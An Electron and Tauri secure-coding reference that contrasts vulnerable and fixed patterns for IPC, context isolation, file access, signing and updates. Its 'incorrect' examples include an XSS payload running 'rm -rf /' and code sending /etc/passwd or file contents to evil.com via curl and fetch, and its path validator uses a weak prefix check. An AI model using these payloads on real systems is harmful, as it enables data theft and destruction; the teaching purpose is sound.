# Desktop Application Code Patterns

## Purpose

This reference provides concrete correct vs. incorrect code patterns for common desktop application security, performance, and architecture bugs. These are not checklists — they are examples that activate expert reasoning about what secure, performant desktop code looks like.

When this reference is active, the agent should use these patterns as diagnostic templates: "Does the code I'm reading/writing match the CORRECT pattern, or does it resemble the WRONG pattern?"

---

## Pattern 1: nodeIntegration Enabled — Renderer Has Full Node.js Access

**What goes wrong:** Any XSS vulnerability in the renderer becomes full remote code execution. An attacker who can inject `<img onerror="require('child_process').exec('rm -rf /')">` owns the user's machine.

### INCORRECT — nodeIntegration enabled, no context isolation
```typescript
// main.ts — DANGEROUS: renderer has full Node.js access
const mainWindow = new BrowserWindow({
  width: 1200,
  height: 800,
  webPreferences: {
    nodeIntegration: true,       // CRITICAL: enables require() in renderer
    contextIsolation: false,     // CRITICAL: preload shares scope with page
  }
});

// renderer.ts — can access anything Node.js can
import { readFileSync, writeFileSync } from 'fs';
import { execSync } from 'child_process';

// This code runs in the renderer with full system access
const secrets = readFileSync('/etc/passwd', 'utf8');
execSync('curl https://evil.com/exfil?data=' + encodeURIComponent(secrets));
```

**Why this is wrong:** The renderer process is equivalent to a browser tab. Anything that can inject HTML or JavaScript into the renderer (user-generated content, loaded URLs, third-party scripts) gets full access to the operating system. This is the most critical Electron security vulnerability.

### CORRECT — nodeIntegration disabled, context isolation enabled, secure preload
```typescript
// main.ts — SECURE: renderer is sandboxed
const mainWindow = new BrowserWindow({
  width: 1200,
  height: 800,
  webPreferences: {
    nodeIntegration: false,      // renderer cannot use require()
    contextIsolation: true,      // preload runs in isolated context
    sandbox: true,               // OS-level sandboxing
    preload: path.join(__dirname, 'preload.js'),
  }
});

// preload.ts — exposes ONLY specific, validated APIs
import { contextBridge, ipcRenderer } from 'electron';

contextBridge.exposeInMainWorld('api', {
  readFile: (filePath: string) => ipcRenderer.invoke('fs:read-file', filePath),
  writeFile: (filePath: string, content: string) =>
    ipcRenderer.invoke('fs:write-file', filePath, content),
});

// main.ts — IPC handler validates before executing
ipcMain.handle('fs:read-file', async (_event, filePath: string) => {
  // Validate: only allow files within the app's data directory
  const resolved = path.resolve(filePath);
  const allowed = path.resolve(app.getPath('userData'));
  if (!resolved.startsWith(allowed)) {
    throw new Error('Access denied: path outside app data directory');
  }
  return fs.promises.readFile(resolved, 'utf8');
});
```

**Why this is correct:** The renderer has zero direct Node.js access. All operations go through typed IPC channels. The main process validates every request against an allowlist before executing.

---

## Pattern 2: IPC Without Validation — Accepting Any Message Shape

**What goes wrong:** A compromised or buggy renderer sends malformed IPC messages that crash the main process, corrupt data, or bypass authorization checks.

### INCORRECT — no input validation on IPC handlers
```typescript
// main.ts — accepts anything from renderer
ipcMain.handle('db:query', async (_event, query: string) => {
  // No validation — renderer can send any SQL
  return database.exec(query);
});

ipcMain.handle('file:write', async (_event, path: string, data: any) => {
  // No path validation — can write anywhere
  fs.writeFileSync(path, data);
});

ipcMain.on('config:update', (_event, config: any) => {
  // No shape validation — can overwrite any config key
  Object.assign(appConfig, config);
  saveConfig(appConfig);
});
```

**Why this is wrong:** The renderer is untrusted. Accepting arbitrary SQL, file paths, or configuration objects from the renderer is equivalent to accepting them from an external attacker.

### CORRECT — typed, validated IPC with explicit allowlists
```typescript
// shared/ipc-types.ts — shared type definitions
interface IpcChannels {
  'db:get-tasks': { args: { projectId: string; status?: TaskStatus }; result: Task[] };
  'file:save-document': { args: { docId: string; content: string }; result: { saved: boolean } };
  'config:set-theme': { args: { theme: 'light' | 'dark' }; result: void };
}

type TaskStatus = 'active' | 'completed' | 'archived';

// main.ts — validated handlers
import { z } from 'zod';

const GetTasksSchema = z.object({
  projectId: z.string().uuid(),
  status: z.enum(['active', 'completed', 'archived']).optional(),
});

ipcMain.handle('db:get-tasks', async (_event, args: unknown) => {
  const parsed = GetTasksSchema.parse(args);  // throws on invalid input
  return database.tasks.find({
    projectId: parsed.projectId,
    ...(parsed.status && { status: parsed.status }),
  });
});

const SaveDocSchema = z.object({
  docId: z.string().uuid(),
  content: z.string().max(10_000_000),  // 10MB max
});

ipcMain.handle('file:save-document', async (_event, args: unknown) => {
  const parsed = SaveDocSchema.parse(args);
  const docPath = path.join(app.getPath('userData'), 'docs', `${parsed.docId}.md`);
  await fs.promises.writeFile(docPath, parsed.content, 'utf8');
  return { saved: true };
});
```

**Why this is correct:** Every IPC channel has a typed schema. Input is validated with a schema library (zod) before any operation. File paths are constructed server-side from validated IDs, never from renderer-provided paths.

---

## Pattern 3: Blocking the Main Process — Synchronous Operations Freezing All Windows

**What goes wrong:** The main process is single-threaded. A synchronous file read, database query, or network request blocks all window management, IPC handling, menu updates, and native dialogs. The entire app freezes.

### INCORRECT — synchronous operations in main process
```typescript
// main.ts — BLOCKS everything
ipcMain.handle('data:import', (_event, filePath: string) => {
  // Synchronous read of potentially large file — freezes all windows
  const raw = fs.readFileSync(filePath, 'utf8');
  const parsed = JSON.parse(raw);  // blocks during parse

  // Synchronous database writes — blocks during I/O
  for (const item of parsed.items) {
    database.runSync('INSERT INTO items VALUES (?, ?, ?)', [item.id, item.name, item.value]);
  }

  return { imported: parsed.items.length };
});

// Also bad: synchronous IPC from renderer
// renderer.ts
const result = window.api.sendSync('heavy-computation', data);  // blocks renderer too
```

**Why this is wrong:** While `readFileSync` executes, no other IPC messages are processed, no windows can be moved or resized, and no menu clicks are handled. If the file is 100MB, the app is frozen for seconds.

### CORRECT — async operations with progress reporting
```typescript
// main.ts — non-blocking with progress
ipcMain.handle('data:import', async (event, filePath: string) => {
  const stream = fs.createReadStream(filePath, { encoding: 'utf8' });
  const items: DataItem[] = [];
  let processed = 0;

  // Stream-based parsing — never loads entire file into memory
  const parser = createJsonStreamParser();
  for await (const item of parser.parseStream(stream)) {
    items.push(item);
    processed++;

    // Report progress back to renderer without blocking
    if (processed % 100 === 0) {
      event.sender.send('data:import-progress', {
        processed,
        status: 'importing',
      });
    }
  }

  // Batch database writes in a transaction
  await database.transaction(async (tx) => {
    for (const batch of chunk(items, 500)) {
      await tx.insertBatch('items', batch);
    }
  });

  return { imported: items.length };
});
```

**Why this is correct:** File reading is streamed (constant memory), database writes are batched in a transaction, and progress is reported to the renderer. The main process event loop is never blocked for more than a few milliseconds at a time.

---

## Pattern 4: Missing Context Isolation — Preload Shares Global Scope

**What goes wrong:** Without context isolation, the preload script's variables and functions are directly accessible from the renderer's web content. A malicious script in the renderer can overwrite preload functions to intercept or modify IPC calls.

### INCORRECT — no context isolation, preload pollutes global scope
```typescript
// main.ts
const win = new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,
    contextIsolation: false,  // DANGEROUS: preload shares scope with renderer
    preload: path.join(__dirname, 'preload.js'),
  }
});

// preload.ts — directly assigns to window
const { ipcRenderer } = require('electron');

// These are directly on the renderer's window object
window.readFile = (path: string) => ipcRenderer.invoke('fs:read', path);
window.writeFile = (path: string, data: string) => ipcRenderer.invoke('fs:write', path, data);

// renderer.ts (or injected malicious script) — can override preload functions
// Attacker overwrites readFile to intercept all file reads
const originalReadFile = window.readFile;
window.readFile = async (path: string) => {
  const content = await originalReadFile(path);
  fetch('https://evil.com/exfil', { method: 'POST', body: content }); // exfiltrate
  return content;
};
```

**Why this is wrong:** Without `contextIsolation: true`, the preload script and the renderer page share the same JavaScript global scope. Any script in the renderer can access, modify, or replace preload-defined functions. Prototype pollution attacks can also intercept IPC calls.

### CORRECT — context isolation with contextBridge
```typescript
// main.ts
const win = new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,     // preload runs in isolated world
    sandbox: true,
    preload: path.join(__dirname, 'preload.js'),
  }
});

// preload.ts — uses contextBridge for safe exposure
import { contextBridge, ipcRenderer } from 'electron';

// contextBridge creates a frozen copy — renderer cannot modify these functions
contextBridge.exposeInMainWorld('api', {
  readFile: (filePath: string) => ipcRenderer.invoke('fs:read', filePath),
  writeFile: (filePath: string, data: string) =>
    ipcRenderer.invoke('fs:write', filePath, data),
  onProgress: (callback: (progress: number) => void) => {
    const handler = (_event: Electron.IpcRendererEvent, progress: number) =>
      callback(progress);
    ipcRenderer.on('progress', handler);
    // Return cleanup function
    return () => ipcRenderer.removeListener('progress', handler);
  },
});

// renderer.ts — can use but cannot modify window.api
const content = await window.api.readFile('/app/data/config.json');
// window.api.readFile = maliciousFunction; // TypeError: Cannot assign to read only property
```

**Why this is correct:** `contextBridge.exposeInMainWorld` creates a frozen, non-configurable copy of the API object in the renderer's world. The renderer can call the functions but cannot replace, wrap, or intercept them. The preload's actual `ipcRenderer` reference is never exposed.

---

## Pattern 5: Hardcoded File Paths — Paths That Break on Different OS/User Configs

**What goes wrong:** The app works on the developer's machine and fails on every other machine with a different username, OS, or installation path.

### INCORRECT — hardcoded paths
```typescript
// Hardcoded Windows path — fails on macOS/Linux
const configPath = 'C:\\Users\\developer\\AppData\\Roaming\\MyApp\\config.json';

// Hardcoded Unix path — fails on Windows
const logPath = '/home/user/.myapp/logs/app.log';

// Hardcoded separator — breaks on the other OS
const dataPath = app.getPath('userData') + '/data/' + fileName;

// Assumes temp directory location
const tempFile = '/tmp/myapp-export.csv';

// Assumes the app is in a specific location
const resourcePath = '/usr/local/lib/myapp/resources/icon.png';
```

**Why this is wrong:** File paths are OS-specific. User directories, temp directories, separators, and app installation paths all differ between Windows, macOS, and Linux. Even on the same OS, different users have different home directories.

### CORRECT — dynamic paths with Electron APIs
```typescript
import { app } from 'electron';
import path from 'path';
import os from 'os';

// Use Electron's path APIs for standard directories
const configPath = path.join(app.getPath('userData'), 'config.json');
// Windows: C:\Users\<user>\AppData\Roaming\MyApp\config.json
// macOS:   ~/Library/Application Support/MyApp/config.json
// Linux:   ~/.config/MyApp/config.json

const logPath = path.join(app.getPath('logs'), 'app.log');
// Uses OS-appropriate log directory

const tempFile = path.join(app.getPath('temp'), 'myapp-export.csv');
// Uses OS temp directory

// For resources bundled with the app
const resourcePath = path.join(
  app.isPackaged ? process.resourcesPath : path.join(__dirname, '..', 'resources'),
  'icon.png'
);

// For user documents
const exportDir = path.join(app.getPath('documents'), 'MyApp Exports');
await fs.promises.mkdir(exportDir, { recursive: true });
```

**Why this is correct:** `app.getPath()` returns the OS-appropriate directory for each purpose. `path.join()` uses the correct separator. `process.resourcesPath` handles the difference between development and packaged app resource locations.

---

## Pattern 6: No Code Signing — OS Security Warnings and Update Failures

**What goes wrong:** Users see "unidentified developer" warnings on macOS, SmartScreen warnings on Windows, and auto-update fails because the new binary's signature does not match the installed binary's signature.

### INCORRECT — unsigned builds, no notarization
```javascript
// electron-builder.config.js — missing signing configuration
module.exports = {
  appId: 'com.mycompany.myapp',
  mac: {
    target: 'dmg',
    // No identity, no notarize, no hardened runtime
  },
  win: {
    target: 'nsis',
    // No certificateFile, no certificatePassword
  },
  linux: {
    target: 'AppImage',
  },
  // No afterSign hook for notarization
};
```

**Why this is wrong:** macOS will show "cannot be opened because the developer cannot be verified." Windows SmartScreen will warn "Windows protected your PC." Many corporate environments block unsigned executables entirely. Auto-update (electron-updater) requires matching signatures between the installed app and the update.

### CORRECT — full signing and notarization pipeline
```javascript
// electron-builder.config.js — complete signing configuration
module.exports = {
  appId: 'com.mycompany.myapp',
  mac: {
    target: ['dmg', 'zip'],      // zip required for auto-update
    identity: 'Developer ID Application: My Company (TEAMID)',
    hardenedRuntime: true,
    gatekeeperAssess: false,
    entitlements: 'build/entitlements.mac.plist',
    entitlementsInherit: 'build/entitlements.mac.plist',
    notarize: {
      teamId: process.env.APPLE_TEAM_ID,
    },
  },
  win: {
    target: 'nsis',
    signingHashAlgorithms: ['sha256'],
    sign: './scripts/sign-windows.js',  // Custom signing for EV certificates
  },
  linux: {
    target: ['AppImage', 'deb', 'rpm'],
  },
  afterSign: 'scripts/notarize.js',
  publish: {
    provider: 'github',           // or S3, generic server
    releaseType: 'release',
  },
};

// scripts/notarize.js
const { notarize } = require('@electron/notarize');

exports.default = async function notarizing(context) {
  if (context.electronPlatformName !== 'darwin') return;
  await notarize({
    appPath: path.join(context.appOutDir, `${context.packager.appInfo.productName}.app`),
    appleId: process.env.APPLE_ID,
    appleIdPassword: process.env.APPLE_APP_PASSWORD,
    teamId: process.env.APPLE_TEAM_ID,
  });
};
```

**Why this is correct:** macOS builds are signed with a Developer ID, hardened runtime is enabled (required for notarization), and notarization is automated. Windows builds use SHA-256 signing. Auto-update will work because signatures match.

---

## Pattern 7: Missing Graceful Window Management — Orphaned Windows and State Loss

**What goes wrong:** Windows are created but never properly destroyed, leading to memory leaks. Window state (position, size) is lost on restart. Closing the last window does not quit the app on Windows/Linux (or does quit on macOS, which is wrong).

### INCORRECT — naive window management
```typescript
// main.ts — no state persistence, no lifecycle management
function createWindow() {
  const win = new BrowserWindow({ width: 800, height: 600 });
  win.loadFile('index.html');
  // No state saving, no close handling, no macOS dock behavior
}

app.whenReady().then(createWindow);

// Missing: app.on('window-all-closed') — default behavior varies by platform
// Missing: app.on('activate') — macOS dock click does nothing
// Missing: win.on('close') — state is lost
```

**Why this is wrong:** On macOS, closing all windows should keep the app running (dock icon stays). On Windows/Linux, it should quit. Window position and size should be restored on relaunch. Without explicit handling, Electron's defaults may not match platform conventions.

### CORRECT — full window lifecycle with state persistence
```typescript
// main.ts — complete window management
import Store from 'electron-store';

const store = new Store<{ windowBounds: Electron.Rectangle }>();

function createMainWindow(): BrowserWindow {
  const bounds = store.get('windowBounds', { x: undefined, y: undefined, width: 1200, height: 800 });

  const win = new BrowserWindow({
    ...bounds,
    minWidth: 600,
    minHeight: 400,
    show: false,  // Prevent flash of white — show when ready
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      sandbox: true,
      preload: path.join(__dirname, 'preload.js'),
    },
  });

  // Show when content is ready (prevents white flash)
  win.once('ready-to-show', () => win.show());

  // Save window bounds on move/resize
  const saveBounds = () => {
    if (!win.isMinimized() && !win.isMaximized()) {
      store.set('windowBounds', win.getBounds());
    }
  };
  win.on('resize', saveBounds);
  win.on('move', saveBounds);

  // Clean up references
  win.on('closed', () => {
    mainWindow = null;
  });

  win.loadFile('index.html');
  return win;
}

let mainWindow: BrowserWindow | null = null;

app.whenReady().then(() => {
  mainWindow = createMainWindow();
});

// macOS: keep app running when all windows closed (dock icon persists)
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

// macOS: re-create window when dock icon clicked
app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    mainWindow = createMainWindow();
  }
});
```

**Why this is correct:** Window bounds are persisted and restored. The `ready-to-show` pattern prevents the white flash. macOS dock behavior is correct. Window references are cleaned up on close.

---

## Pattern 8: Synchronous IPC (sendSync) — Blocking Renderer on Main Process

**What goes wrong:** `ipcRenderer.sendSync()` blocks the renderer process until the main process responds. If the main process is busy or the handler is slow, the renderer freezes — the UI becomes unresponsive, animations stop, and user input is lost.

### INCORRECT — synchronous IPC calls
```typescript
// preload.ts — exposes sync IPC
contextBridge.exposeInMainWorld('api', {
  getConfig: () => ipcRenderer.sendSync('config:get'),       // BLOCKS renderer
  saveFile: (data: string) => ipcRenderer.sendSync('file:save', data), // BLOCKS renderer
  getSystemInfo: () => ipcRenderer.sendSync('system:info'),  // BLOCKS renderer
});

// renderer.ts — UI freezes during each call
function handleSave() {
  setSaving(true);
  const result = window.api.saveFile(editorContent);  // UI frozen until main responds
  setSaving(false);  // user never sees the loading state
}
```

**Why this is wrong:** `sendSync` is a blocking call. The renderer's event loop stops while waiting for the main process. If the main process takes 500ms to write a file, the renderer is frozen for 500ms. Users see a hung UI.

### CORRECT — async IPC with invoke/handle
```typescript
// preload.ts — async IPC only
contextBridge.exposeInMainWorld('api', {
  getConfig: () => ipcRenderer.invoke('config:get'),
  saveFile: (data: string) => ipcRenderer.invoke('file:save', data),
  getSystemInfo: () => ipcRenderer.invoke('system:info'),
});

// renderer.ts — non-blocking with proper loading states
async function handleSave() {
  setSaving(true);
  try {
    const result = await window.api.saveFile(editorContent);
    showNotification('Saved successfully');
  } catch (error) {
    showError(`Save failed: ${error.message}`);
  } finally {
    setSaving(false);
  }
}
```

**Why this is correct:** `ipcRenderer.invoke` returns a Promise. The renderer remains responsive while the main process handles the request. Loading states work correctly because the UI re-renders between the start and completion of the operation.

---

## Pattern 9: Unrestricted File System Access — Renderer Reading/Writing Arbitrary Paths

**What goes wrong:** The IPC handler accepts file paths from the renderer without validation, allowing a compromised renderer to read sensitive system files or overwrite critical application data.

### INCORRECT — pass-through file paths from renderer
```typescript
// main.ts — blindly trusts renderer-provided paths
ipcMain.handle('fs:read', async (_event, filePath: string) => {
  return fs.promises.readFile(filePath, 'utf8');  // can read /etc/shadow, ~/.ssh/id_rsa
});

ipcMain.handle('fs:write', async (_event, filePath: string, content: string) => {
  return fs.promises.writeFile(filePath, content);  // can overwrite system files
});

ipcMain.handle('fs:delete', async (_event, filePath: string) => {
  return fs.promises.unlink(filePath);  // can delete anything
});
```

**Why this is wrong:** A compromised renderer (via XSS, malicious content, or a dependency vulnerability) can read SSH keys, browser cookies, password databases, or any file readable by the current user. It can also overwrite application binaries or system configuration.

### CORRECT — scoped file access with path validation
```typescript
// main.ts — all file operations scoped to allowed directories
const ALLOWED_ROOTS = [
  app.getPath('userData'),     // App data directory
  app.getPath('documents'),    // User documents (only if app needs it)
];

function validatePath(requestedPath: string): string {
  const resolved = path.resolve(requestedPath);

  // Check against allowed roots
  const isAllowed = ALLOWED_ROOTS.some(root =>
    resolved.startsWith(path.resolve(root))
  );
  if (!isAllowed) {
    throw new Error(`Access denied: ${resolved} is outside allowed directories`);
  }

  // Prevent path traversal
  if (resolved.includes('..')) {
    throw new Error('Path traversal detected');
  }

  return resolved;
}

ipcMain.handle('fs:read', async (_event, filePath: string) => {
  const safe = validatePath(filePath);
  return fs.promises.readFile(safe, 'utf8');
});

ipcMain.handle('fs:write', async (_event, filePath: string, content: string) => {
  const safe = validatePath(filePath);
  await fs.promises.writeFile(safe, content);
  return { written: true };
});

// For user-initiated file operations, use native dialogs
ipcMain.handle('fs:open-dialog', async () => {
  const result = await dialog.showOpenDialog({
    properties: ['openFile'],
    filters: [{ name: 'Documents', extensions: ['md', 'txt', 'json'] }],
  });
  if (result.canceled) return null;
  // Read directly — the user chose this file via native dialog
  return fs.promises.readFile(result.filePaths[0], 'utf8');
});
```

**Why this is correct:** All programmatic file access is scoped to allowed directories. User-initiated file operations use native dialogs (which are trusted because the user explicitly selects the file). Path traversal is blocked.

---

## Pattern 10: Missing Auto-Update Error Handling — Silent Update Failures

**What goes wrong:** The auto-updater is configured but error handling is missing. Updates fail silently — users stay on old versions, security patches are never applied, and the development team has no visibility into update failures.

### INCORRECT — fire-and-forget update check
```typescript
// main.ts — no error handling, no user feedback
import { autoUpdater } from 'electron-updater';

app.whenReady().then(() => {
  autoUpdater.checkForUpdatesAndNotify();  // fire and forget
  // What if the server is down? What if signing fails? What if disk is full?
  // Nobody knows. The update silently fails.
});
```

**Why this is wrong:** `checkForUpdatesAndNotify` swallows errors. If the update server returns a 500, the signing check fails, or the download is interrupted, the app continues running the old version. There is no telemetry, no retry logic, and no user notification.

### CORRECT — full update lifecycle with error handling and rollback
```typescript
// main.ts — complete update management
import { autoUpdater, UpdateInfo } from 'electron-updater';
import log from 'electron-log';

class UpdateManager {
  private mainWindow: BrowserWindow;
  private updateAvailable = false;

  constructor(mainWindow: BrowserWindow) {
    this.mainWindow = mainWindow;
    this.setupAutoUpdater();
  }

  private setupAutoUpdater() {
    autoUpdater.logger = log;
    autoUpdater.autoDownload = false;       // Don't download without user consent
    autoUpdater.autoInstallOnAppQuit = true;

    autoUpdater.on('checking-for-update', () => {
      log.info('Update: checking...');
    });

    autoUpdater.on('update-available', (info: UpdateInfo) => {
      log.info(`Update available: ${info.version}`);
      this.updateAvailable = true;
      // Notify renderer — let user decide when to download
      this.mainWindow.webContents.send('update:available', {
        version: info.version,
        releaseNotes: info.releaseNotes,
      });
    });

    autoUpdater.on('update-not-available', () => {
      log.info('Update: current version is latest');
    });

    autoUpdater.on('download-progress', (progress) => {
      this.mainWindow.webContents.send('update:progress', {
        percent: progress.percent,
        bytesPerSecond: progress.bytesPerSecond,
      });
    });

    autoUpdater.on('update-downloaded', (info: UpdateInfo) => {
      log.info(`Update downloaded: ${info.version}`);
      this.mainWindow.webContents.send('update:ready', {
        version: info.version,
      });
    });

    autoUpdater.on('error', (error: Error) => {
      log.error('Update error:', error.message);
      // Don't crash — the app works fine without the update
      this.mainWindow.webContents.send('update:error', {
        message: error.message,
      });
    });
  }

  async checkForUpdates() {
    try {
      await autoUpdater.checkForUpdates();
    } catch (error) {
      log.error('Update check failed:', error);
      // Retry after 1 hour
      setTimeout(() => this.checkForUpdates(), 60 * 60 * 1000);
    }
  }

  async downloadUpdate() {
    if (!this.updateAvailable) return;
    try {
      await autoUpdater.downloadUpdate();
    } catch (error) {
      log.error('Download failed:', error);
      this.mainWindow.webContents.send('update:error', {
        message: `Download failed: ${error.message}. Will retry later.`,
      });
    }
  }

  installUpdate() {
    autoUpdater.quitAndInstall(false, true);  // (isSilent, forceRunAfter)
  }
}

// Usage in main
app.whenReady().then(() => {
  const mainWindow = createMainWindow();
  const updater = new UpdateManager(mainWindow);

  // Check for updates 30 seconds after launch (don't block startup)
  setTimeout(() => updater.checkForUpdates(), 30_000);

  // Check periodically (every 4 hours)
  setInterval(() => updater.checkForUpdates(), 4 * 60 * 60 * 1000);

  // IPC handlers for user-initiated update actions
  ipcMain.handle('update:download', () => updater.downloadUpdate());
  ipcMain.handle('update:install', () => updater.installUpdate());
});
```

**Why this is correct:** Every update lifecycle event is handled. Errors are logged and reported to the user without crashing. Downloads require user consent. Update checks happen after startup (never blocking launch) and retry on failure. The renderer receives progress updates and can display appropriate UI.

---

## Tauri Equivalent Patterns

For Tauri applications, the same security principles apply with Rust-native implementations:

### IPC Validation (Tauri)
```rust
// src-tauri/src/main.rs — Tauri command with validation
use tauri::Manager;
use std::path::PathBuf;

#[tauri::command]
async fn read_file(app: tauri::AppHandle, file_path: String) -> Result<String, String> {
    let app_data = app.path().app_data_dir()
        .map_err(|e| format!("Failed to get app data dir: {}", e))?;

    let resolved = PathBuf::from(&file_path).canonicalize()
        .map_err(|e| format!("Invalid path: {}", e))?;

    // Validate path is within app data directory
    if !resolved.starts_with(&app_data) {
        return Err("Access denied: path outside app data directory".into());
    }

    std::fs::read_to_string(&resolved)
        .map_err(|e| format!("Read failed: {}", e))
}

fn main() {
    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![read_file])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
```

### Window Management (Tauri)
```rust
// src-tauri/src/main.rs — Tauri window with state persistence
use tauri::{Manager, WindowEvent};
use serde::{Serialize, Deserialize};

#[derive(Serialize, Deserialize, Default)]
struct WindowState {
    x: Option<f64>,
    y: Option<f64>,
    width: f64,
    height: f64,
}

fn main() {
    tauri::Builder::default()
        .setup(|app| {
            let state: WindowState = app.store("window-state.json")
                .map(|s| s.get("bounds").cloned().unwrap_or_default())
                .unwrap_or_default();

            let window = tauri::WindowBuilder::new(app, "main")
                .inner_size(state.width.max(600.0), state.height.max(400.0))
                .min_inner_size(600.0, 400.0)
                .build()?;

            if let (Some(x), Some(y)) = (state.x, state.y) {
                let _ = window.set_position(tauri::Position::Physical(
                    tauri::PhysicalPosition::new(x as i32, y as i32),
                ));
            }

            Ok(())
        })
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
```
